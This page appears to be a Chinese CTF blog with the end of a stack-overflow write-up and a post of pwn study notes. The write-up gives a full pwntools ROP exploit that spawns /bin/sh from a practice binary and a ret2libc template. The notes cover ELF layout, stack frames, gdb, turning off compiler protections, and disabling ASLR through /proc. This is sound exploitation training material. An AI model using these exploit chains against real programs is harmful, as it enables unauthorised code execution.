<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload+=p64(pop_r12_pop_r13_pop_r14_pop_r15_ret)</span><br><span class="line">payload+=p64(<span class="number">0x404480</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x404488</span>)+p64(<span class="number">0x4012C0</span>)</span><br><span class="line"><span class="comment">//0x4012C0是mov的指令，0x404488是syscall指令地址存放的地址，</span></span><br><span class="line"><span class="comment">//0x404480是/bin/sh存放的地址</span></span><br></pre></td></tr></table></figure>
<p>第一个payload构造完成<br>开始构造第二个payload2，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload2=b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span>+p64(syscall)</span><br><span class="line"><span class="comment">///bin/sh\x00刚好有8个字节于是再后面syscall的指令，</span></span><br><span class="line"><span class="comment">//刚好是放在/bin/sh的地址加8位后，</span></span><br></pre></td></tr></table></figure>
<p>好，给出完整的脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="meta">#context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span></span><br><span class="line">io=process(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">pop_rbp_ret=<span class="number">0x40117d</span></span><br><span class="line">syscall=<span class="number">0x4011ae</span></span><br><span class="line">pop_rsi_pop_r15_ret=<span class="number">0x4012e1</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x4012e3</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">pop_r13_pop_r14_pop_r15_ret=<span class="number">0x4012de</span></span><br><span class="line">syscall=<span class="number">0x4011ae</span></span><br><span class="line">edi_eax=<span class="number">0x40119E</span></span><br><span class="line">main=<span class="number">0x401223</span></span><br><span class="line">gets=<span class="number">0x401090</span></span><br><span class="line">getplt=<span class="number">0x404028</span></span><br><span class="line">pop_r12_pop_r13_pop_r14_pop_r15_ret=<span class="number">0x4012dc</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">24</span>+p64(pop_rdi_ret)+p64(<span class="number">0x404480</span>)+p64(gets)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0x3b</span>)+p64(pop_rbp_ret)+p64(<span class="number">0x404680</span>)+</span><br><span class="line">p64(edi_eax)+p64(<span class="number">0x404580</span>)+p64(pop_r12_pop_r13_pop_r14_pop_r15_ret)</span><br><span class="line">+p64(<span class="number">0x404480</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404488</span>)+p64(<span class="number">0x4012C0</span>)</span><br><span class="line">payload2=b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span></span><br><span class="line">payload2+=p64(syscall)</span><br><span class="line"><span class="meta">#gdb.attach(io,<span class="string">&#x27;b *0x4012C0&#x27;</span>) </span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">io.sendline(payload)<span class="comment">//第一次传入</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload2)第二次传入</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>#ret2libc<br>在这里将之间讲述无system和无&#x2F;bin&#x2F;sh的情况将32位与64位分开讲述</p>
<p><strong>32位</strong><br>在这类题中一般是动态链接很多操作都不能执行<br>更多的知识不多讲直接将做题的过程<br>对于这种题我们一般可以先调用可已打印东西的函数，如puts的函数将got中谋个函数的地址答应出来，根据动态链接的延迟绑定规定，在第一次调用某个函数之后其在动态链接库中的地址将被写入got表中，我们便可以同过put等打印数据的函数将其打印出来地址，这个地址便是该函数在动态链接库中对应的地址，在题中有很大的可能这个地址是一个变化中的地址，这是系统的一种保护操作，但是一般答应出来的后3位（16进制的数）是不会变的，而我们便可以将这后3位的地址用于判断其动态链接库的类型，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher<span class="comment">//这个可用于自动寻找库，不过可能有点老，反正我没有用这个成功过</span></span><br><span class="line">io=process(<span class="string">&#x27;./文件名&#x27;</span>)</span><br><span class="line">puts_plt=<span class="number">0x00000</span><span class="comment">//puts在plt段的地址，可以直接在ida中找也可以用链接文件后直接用程序找</span></span><br><span class="line">main=<span class="number">0x00000</span><span class="comment">//main函数在text段中的地址，用于在打印地址后返回main从新开始执行</span></span><br><span class="line">libc_start_main=<span class="number">0x000000000</span><span class="comment">//got段中的libc_start_main的地址，在第一次调用后会有真实地址，打印出来</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">22</span>+p32(put_plt)+p32(main)+p32(libc_start_main)</span><br><span class="line"><span class="comment">//32位的函数调用特点，间隔一个放参数。</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;\n&quot;</span>)<span class="comment">//可用可不用，关键根据当时的情况来加入，括号内是程序的输出</span></span><br><span class="line">libcaddr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">//用于接收用puts函数打印出来的__libc_start_main函数的真实地址</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在有libc_start_main函数的真实地址后，可以在网上查找函数的偏移地址<br><img src="http://blog.forevers.love/usr/uploads/2023/12/3046998676.png" alt="屏幕截图 2023-12-09 220543.png">![屏幕截图 2023-12-09 220543](wp&#x2F;屏幕截图 2023-12-09 220543.png)<br>一般来说真实地址的值会因为保护程序的存在而使中间的地址被随机化，但最后的3位（16进制)不会被改变，便可以通过后3位查到偏移量，<br><strong>程序的基本地址&#x3D;__libc_start_main函数的真实地址-__libc_start_main函数的偏移量<br>system函数的真实地址&#x3D;程序的基本地址+system函数的偏移量<br>str_bin_sh函数的真实地址&#x3D;程序的基本地址+str_bin_sh函数的偏移量</strong></p>
<p>然后调用system函数利用str_bin_sh函数，便也可以获得控制权，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main=<span class="number">0x000</span><span class="comment">//__libc_start_main函数的偏移地址</span></span><br><span class="line">system=<span class="number">0x00000</span><span class="comment">//system函数的偏移地址，</span></span><br><span class="line">str_bin_sh=<span class="number">0x000</span><span class="comment">//__libc_start_main函数的偏移地址</span></span><br><span class="line">以上这三个的数值由网上查阅</span><br><span class="line">libcbase_addr=libcaddr-__libc_start_main</span><br><span class="line">system_addr=libcbase_addr+system</span><br><span class="line">binsh_addr=libcbase_addr+str_bin_sh</span><br><span class="line">payload2 = b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">22</span> + p32(sys_addr) + b<span class="number">&#x27;</span>AAAA<span class="number">&#x27;</span> + p32(binsh_addr)</span><br><span class="line"><span class="comment">//这里中间的数为了平衡栈顶要在中间加上4字节的垃圾数据</span></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果要使用LibcSearcher来用着要在要在前面加上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from LibcSearcher import *</span><br></pre></td></tr></table></figure>



      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/CTF/">CTF</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-博客" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/03/27/%E5%8D%9A%E5%AE%A2/" class="article-date">
  	<time datetime="2024-03-27T12:06:41.000Z" itemprop="datePublished">2024-03-27</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/03/27/%E5%8D%9A%E5%AE%A2/">
        pwn基操
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><strong>一vim</strong></p>
<p>vim是我们在使用<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Linux&spm=1001.2101.3001.7020">Linux</a>是经常会使用的工具，新手总是忘记使用方法（当然我也是）。在这里记录下常用命令以防止以后再忘记</p>
<p>1，进入编辑模式： i （在当前位置插入，开始编辑）；</p>
<p>2,保存编辑文本： :w (英文冒号，保存当前编辑的文件）；</p>
<p>3,退出编辑文件： :q（英文冒号，退出当前编辑的文件）；</p>
<p>4,保存并退出： :wq （英文冒号，保存并退出当前编辑的文件）；</p>
<p>5.强制退出：  :q! （英文冒号，强制退出不保存）。</p>
<p>.在vim命令行下输入from</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6,:%!xxd</span><br></pre></td></tr></table></figure>

<blockquote>
<p>“%!”为调用第三方操作对vim内容进行操作，如 :%!tr a-z A-Z 把全文小写字母改成大写。<br>xxd 命令可以为给定的标准输入或者文件做一次十六进制的输出，它也可以将十六进制输出转换为原来的二进制格式，即将任意文件转换为十六进制或二进制形式。</p>
</blockquote>
<p>所以，使用命令之后，会把文档改成十六进制显示。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7</span>,:%!xxd <span class="literal">-r</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>xxd -r 逆向操作:把十六进制转储转换成二进制形式。如果不输出到标准输出,xxd并不把输出文件截断,而是直接写到输出文件。</p>
</blockquote>
<p>9,file+文件名，用于识变文件是什么类型的文件，（与文件的后缀无关），同时也通过这个判断是什么文件x32，x64</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wzg@wzg-virtual-machine:~$ file text.c</span><br><span class="line">text.c: C source, ASCII text</span><br></pre></td></tr></table></figure>

<p>10,text.c是一个C语言源代码，ascll编码的文本</p>
<p>11,rm+文件名，删除那个文件</p>
<p>12,gcc -S 文件名，可以将文件改为汇编语言文件</p>
<p>13，<code>checksec +文件名</code>，查看文件是否有保护程序</p>
<p>![屏幕截图 2023-11-24 205006](博客\屏幕截图 2023-11-24 205006.png)</p>
<p>PIE：•程序的防护措施，</p>
<p>编译时生效，随机化ELF文件的映射地址，</p>
<p>开启 ASLR 之后，PIE 才会生效。</p>
<p>NX•程序与操作系统的防护措施，编译时决定是否生效，由操作系统实现，</p>
<p>通过在内存页的标识中增加“执行”位, 可以表示该内存页是否可以执行, 若程序代码的 EIP 执行至不可运行的内存页, 则 CPU 将直接拒绝执行“指令”造成程序崩溃。</p>
<p>canary：•程序的防护措施，编译时生效</p>
<p>•在刚进入函数时，在栈上放置一个标志canary，在函数返回时检测其是否被改变。以达到防护栈溢出的目的，*.canary长度为1字长，其位置不一-&#x2F;14578定与ebp&#x2F;rbp存储的位置相邻，具体得看程序的汇编操作。</p>
<p>RELRO：•程序的防护措施，编译时生效</p>
<p>•部分 RELRO: 在程序装入后, 将其中一些段(如.dynamic)标记为只读, 防止程序的一些重定位信息被修改</p>
<p>•完全 RELRO: 在部分 RELRO 的基础上, 在程序装入时, 直接解析完所有符号并填入对应的值, 此时所有的 GOT 表项都已初始化, 且不装入link_map与_dl_runtime_resolve的地址。</p>
<p>![屏幕截图 2023-11-18 193922](博客\屏幕截图 2023-11-18 193922.png)</p>
<p>可执行文件</p>
<p>广义：文件中的数据是可执行代码的文件.out、.exe、.sh、.py</p>
<p>狭义：文件中的数据是机器码的文件.out、.exe、.dll、.so</p>
<p>分类：</p>
<p>Windows：PE（Portable Executable）可执行程序.exe动态链接库.dll静态链接库.lib</p>
<p>Linux：ELF（Executable and Linkable Format）可执行程序.out动态链接库.so静态链接库.a</p>
<p><img src="/2024/03/27/%E5%8D%9A%E5%AE%A2/(%E5%8D%9A%E5%AE%A2%5C%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="image-20231118202418867"></p>
<p>•ELF文件头表（ELF header）</p>
<p>•记录了ELF文件的组织结构</p>
<p>给系统看</p>
<p>•</p>
<p>•程序头表&#x2F;段表（Program header table）</p>
<p>•告诉系统如何创建进程</p>
<p>•生成进程的可执行文件必须拥有此结构</p>
<p>•重定位文件不一定需要</p>
<p>•</p>
<p>•节头表（Section header table）&#x2F;&#x2F;用来组织elf文件春村</p>
<p>•记录了ELF文件的节区信息</p>
<p>•用于链接的目标文件必须拥有此结构</p>
<p>其它类型目标文件不一定</p>
<p>•代码段（Text segment）包含了代码与只读数据</p>
<p>•.text 节&#x2F;&#x2F;</p>
<p>•.rodata 节 </p>
<p>•.hash 节 </p>
<p>•.dynsym 节 </p>
<p>•.dynstr 节 </p>
<p>•.plt 节&#x2F;&#x2F;</p>
<p>•.rel.got 节 </p>
<p>•……</p>
<p>•数据段（Data segment）包含了可读可写数据</p>
<p>•.data 节 </p>
<p>•.dynamic 节 </p>
<p>•.got 节 </p>
<p>•.got.plt 节&#x2F;&#x2F;用于保存plt节中的代码解析到实际的动态连接的函数的地址</p>
<p>•.bss 节&#x2F;&#x2F;只在内存中占空间不在磁盘中占有空间</p>
<p>•……</p>
<p>•栈段（Stack segment）</p>
<p>![屏幕截图 2023-11-19 102459](博客\屏幕截图 2023-11-19 102459.png)</p>
<p>kemel，内核</p>
<p>starck堆栈</p>
<p>shared libraries，共享库</p>
<p>heap堆，动态存储区，malloc在程序执行后才有的空间在其中</p>
<p>unused未使用 </p>
<p>text代码段：main函数，sum函数，具体实现的机械码都放在其中，会有一些不可写的代码</p>
<p>data段会存放已初始化的全局变量，str</p>
<p>bss段存放未初始化的全局变量，glb（不占用内存空间）</p>
<p>![屏幕截图 2023-11-19 105211](博客\屏幕截图 2023-11-19 105211.png)</p>
<p>小端序：数据从左往右，存的时候从下到上</p>
<p>​     </p>
<p>•RIP</p>
<p>•存放当前执行的指令的地址</p>
<p>•RSP</p>
<p>•存放当前栈帧的栈顶地址</p>
<p>•RBP</p>
<p>•存放当前栈帧的栈底地址</p>
<p>•RAX</p>
<p>•通用寄存器。存放函数返回值</p>
<p>栈（stack）：地址从高地址往低地址增长（从上往下），</p>
<p>堆（heap）：地址从低地址往高地址增长（从下往上），</p>
<p>在栈和堆中有shared libraries（共享库），且大小为止，通过两者不同的增长方向使其充分利用空间</p>
<p> ![屏幕截图 2023-11-19 114829](博客\屏幕截图 2023-11-19 114829.png)</p>
<p>high address高地址；caller’s Function state函数功能状态;stack top顶端;low address低地址</p>
<p>![屏幕截图 2023-11-19 120035](博客\屏幕截图 2023-11-19 120035.png)</p>
<p>•函数状态主要涉及三个寄存器 —— esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。</p>
<p>ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。</p>
<p>eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p>
<p>•下面让我们来看看发生函数调用时，栈顶函数状态以及上述寄存器的变化。变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态。</p>
<p>•首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。</p>
<p>![image-20231119143141350](博客&#x2F;屏幕截图 2023-11-19 120035-17115442857899-171154428701611-171154428884713-171154429006215.png)</p>
<p>​                                    将被调用函数的参数压入栈内</p>
<p>high address高地址；low address低地址；return address回信地址；stack top顶端；caller访客；</p>
<p>function state功能状态;</p>
<p>（1）esp：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</p>
<p>（2）ebp：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</p>
<p>在栈中ebp常常保存着的是上一个函数的返回值，用于在栈使用完后返回之前的函数，在栈顶</p>
<p>其中的值是一个指针指向原来的函数的栈低。</p>
<p>在ebp的更高一位地址有一个更为重要的域：return address![屏幕截图 2023-11-20 210719](博客\屏幕截图 2023-11-20 210719.png)</p>
<p>当一个域的函数执行完其中的代码开始执行return前，会先将栈中的esp移到与ebp相同的指向地址并指向这里</p>
<p>之后由于ebp中存放的是上一个函数的返回值，ebp便通过这个地址指向上一个函数栈顶，同时存放再上一个函数的返回值，与此同时esp自动加一指向return address；</p>
<p>在ebp和esp中有一个变量可以由我们向其中输入无限的变量，那我们便可通过输入的数据将ebp指向的上面的数据覆盖，然后在程序执行时，到返回地址时由于已经被我们写入的数据覆盖，会直接返回我们写入的地址，从而达到我们的目标，在ida中我们可以先找到那个变量，便可以看到他与ebp和esp的距离，如：char s;&#x2F;&#x2F; [esp+1ch] [ebp-64h]（可能会出现错误，如果有错用动态调试）,我们可以看到此时的s变量距离ebp是0x64字节，当我们向其中写入0x64个字节的数据便可以到ebp的位置，在向上写4个字节便可以覆盖ebp指向的位置，在写4个字节便是要返回的话数值，于是我们只要想s中写入0x68字节的垃圾数据和0x4个字节的特殊数据便可以在函数执行后不正常反悔而是返回到我们需要的值。</p>
<p>通过sub   esp，空间大小           确定栈的空间大小；</p>
<p>esp始终指向栈顶，ebp是在堆栈中寻址用的</p>
<p><strong>栈帧</strong>也叫过程活动记录，是编译器用来实现过程&#x2F;函数调用的一种数据结构。简言之，<strong>栈帧</strong>就是利用<code>EBP</code>（栈帧指针，<strong>请注意不是ESP</strong>）寄存器访问局部变量、参数、函数返回地址等</p>
<p><strong>栈溢出</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span> str[<span class="number">8</span>];</span><br><span class="line">read(<span class="number">0</span>,str,<span class="number">24</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上面那个程序中str在main函数中栈有8个字节的缓冲区，通过read函数输入值进入str中</p>
<p>在机械执行的过程先将ebq入栈，用于固定返回位置，但是在输入值时由于超出str的区域，使得原本用于返回的值被覆盖，当程序执行到那时不在返回原本应该返回的值，从而出现错误。</p>
<p>00</p>
<p>传参：</p>
<p>•x86</p>
<p>•使用栈来传递参数</p>
<p>•使用 eax 存放返回值</p>
<p>•amd64</p>
<p>•前6个参数依次存放于 rdi、rsi、rdx、rcx、r8、r9 寄存器中</p>
<p>•第7个以后的参数存放于栈中</p>
<p>nc+网址 用于远程链接 </p>
<p><strong>pwntools</strong></p>
<p>在python中 先输入</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br></pre></td></tr></table></figure>

<p>导入环境，通过</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">&quot;./文件名&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>与本地的程序建立一个链接，并获的pid：进程号（文件要是可执行文件）；通过</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io = remote(<span class="string">&quot;ip&quot;</span>,端口)</span><br></pre></td></tr></table></figure>

<p>与远程端口链接。吧“</p>
<p>在于端口连接后需要接送端口传来的数据可以通过</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.recvline()</span><br></pre></td></tr></table></figure>

<p>接收传来的一行数据，但只能是一行，</p>
<p>若要向端口传输数据，需注意由于是端口只能传输数据流，需进行特殊处理</p>
<p>传整数，根据传输对象加上p32（）或者p64（），在字符串前加上b(“”)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">12</span>+p32(<span class="number">0x75834</span>))<span class="comment">//也可以换send但要在字符串后加\n</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;程序的输出&#x27;</span>,payload)</span><br></pre></td></tr></table></figure>

<p>若端口在接收数据后会返回程序通过</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.recv()</span><br></pre></td></tr></table></figure>

<p>一般在最后会加上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.interactive() 允许我们在终端里将命令传送到远程服务器. Pwntools 会自动接收输出并回显 .</span><br></pre></td></tr></table></figure>

<p>接收端口的返回</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(b<span class="string">&quot;;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>以为接收程序发的数据直到；这个符号为止</p>
<p>写Python脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/python3</span><br><span class="line">from pwn import *</span><br><span class="line">    ...</span><br><span class="line">io.interactive()    </span><br></pre></td></tr></table></figure>

<p>写好之后用python +这个文件名</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *地址&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>用于在程序进行之中时，进入调试状态。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&quot;main_real_addr:&quot;</span>,main_real_addr)</span><br></pre></td></tr></table></figure>



<p>ljust() 方法将使用指定的字符（默认为空格）作为填充字符使字符串左对齐</p>
<ul>
<li><p><input disabled type="checkbox"> 
在pwntools中shellcraft.sh   shellcode      elf.search，ljust</p>
</li>
<li><p><input disabled type="checkbox"> </p>
<h5 id="函数栈的工作方式，rope链的构造，动态链接的解析过程"><a href="#函数栈的工作方式，rope链的构造，动态链接的解析过程" class="headerlink" title="函数栈的工作方式，rope链的构造，动态链接的解析过程&#x3D;"></a>函数栈的工作方式，rope链的构造，动态链接的解析过程&#x3D;</h5></li>
</ul>
<p>在pwntools中shellcraft.sh</p>
<p>在文件中可以通过如下代码链接，从而对文件中的部分数据进行分析</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&quot;./文件名&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>如果在文件中有puts函数，可以通过如下代码查看puts函数在got表像中的地址（）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hex(elf.got[<span class="string">&quot;puts&quot;</span>])/不加hex（）则打印出来的是十进制数字，hex将十进制转化为<span class="number">16</span>进制</span><br><span class="line">next(elf.search(b<span class="string">&quot;/bin/sh&quot;</span>))    </span><br></pre></td></tr></table></figure>



<p><strong>动态调试</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb 文件名（必须是可执行的文件a.out）</span><br></pre></td></tr></table></figure>

<p>进入调试出现pwndbg&gt;标志吧</p>
<p>b+断点，然后r开始调式</p>
<p>start，程序将停在main函数的第一行，或程序的入口第一条指令。</p>
<p>backtrace显示·整个函数的函数调用栈的状况，由上到下调用，下调用上。</p>
<p>return直接回到main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> #!/bin/sh</span><br><span class="line"><span class="number">2</span> </span><br><span class="line"><span class="number">3</span> gcc -fno-<span class="built_in">stack</span>-protector -z exestack -no-pie -g -o wwww wwww.c </span><br></pre></td></tr></table></figure>

<p>gcc -fno-stack-protector关闭canary</p>
<p>canary保护</p>
<p>当栈被创立的时候会在ebp的下面放上一个随机值，在程序执行到返回时先检查那个随机值是否正确。不正会直接停止运算</p>
<p>-z exestack打开栈的可执行权限</p>
<p>-no-pie,关闭pie</p>
<p>pie 将elf文件的本体和载入地址都随机化（text，data，bss区的地址）</p>
<p>-g可以在调式时代上源代码，但要在最后加上源代码文件</p>
<p>-o输出文件的名字</p>
<p>在保存后用chmod +x 文件名，为文件赋权</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p>修改发送的栈的地址是不是随机值，正常情况下&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space的值为2，若要此时的栈地址则会得到的是一个随机值，修改为0后将称为一个定值，可以通过cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space知道其值为多少，</p>
<p>![屏幕截图 2023-11-21 211454](博客&#x2F;屏幕截图 2023-11-21 211454-17115441695152-17115441721904-17115441747796.png)</p>
<p>通过动态调试，可以知道我们输入的AAA在一开始入栈的地址为0x7fffffffdeb0,而ebp指向的为0x7fffffffdf20，距离是160个字节，故我们要填充的是160+8（x64系统为8个）垃圾数据然后的8个为需要执行的数据，</p>
<p>在攻击前由于程序是x64需通过一下指令在pwntools中修改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.arch =<span class="string">&quot;amd64&quot;</span></span><br></pre></td></tr></table></figure>

<p>ldd 文件名（必须为可执行的文件名），查看该文件用到的所有动态链接库，如图</p>
<p>![屏幕截图 2023-11-21 220537](博客\屏幕截图 2023-11-21 220537.png)</p>
<p>其中要重点关注的是第二行，libc.so.6是软链接相当于快捷方式的值指向的是lib中的存放C语言的动态链接库</p>
<p>动态链接库本身就是一个可执行文件，他也有可执行的入口 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary yichu --only <span class="string">&quot;pop|ret&quot;</span>，？</span><br></pre></td></tr></table></figure>

<p>在yichu这个可执行文件中寻找为pop，ret的汇编代码</p>
<p>在文件名搜system，</p>
<p>int 0x80,中断号代表进行系统调用，调用系统函数时，函数名一般为sys_write（），但是我们不能直接用他的名称只能在调用时用代号，如sys_write()代号为4，sys_execve()代号11,0xb，可以用0xb直接调用sys_execve()</p>
<p>在使用int 0x80，要确保（eax&#x3D;0xb,ebx&#x3D;0x8048xxxx,ecx&#x3D;0,edx&#x3D;0）这4个寄存器都已经完成初始化，eax中的0xb代表的是系统函数的调用代（0xb-&gt;sys_execve()）,ebx中存放的是我们最后要执行到的最后地址，如、bin&#x2F;sh&#x2F;的地址</p>
<p>![屏幕截图 2024-01-07 155233](博客\屏幕截图 2024-01-07 155233.png)</p>
